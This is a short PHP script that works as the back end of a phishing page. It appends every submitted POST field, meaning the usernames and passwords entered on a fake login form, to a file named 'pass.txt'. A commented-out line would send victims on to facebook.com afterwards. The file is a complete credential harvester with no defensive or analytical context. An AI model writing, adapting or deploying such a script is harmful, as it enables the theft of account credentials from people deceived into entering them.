<?php
//header ('location : https://www.facebook.com');
$log = fopen("pass.txt" , "a");
foreach($_POST as  $mjb => $value){
fwrite($log , $mjb);
fwrite($log  ,"=");
fwrite($log , $value);
fwrite($log , "\r\n");
}
fwrite($log , "\r\n");
fclose($log);
exit;


?>
